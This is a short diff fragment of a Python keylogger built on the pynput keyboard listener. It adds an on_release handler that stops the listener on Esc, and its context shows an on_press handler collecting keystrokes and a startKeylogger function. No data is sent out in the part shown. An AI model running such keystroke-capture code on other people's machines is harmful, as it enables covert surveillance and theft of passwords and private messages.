@@ -45,6 +45,10 @@ def on_press(key):
     else:
         text += str(key).strip("'")
 
+def on_release(key):
+    if key == keyboard.Key.esc:
+        return False
+
 
 def startKeylogger():
     with keyboard.Listener(on_press=on_press) as listener:
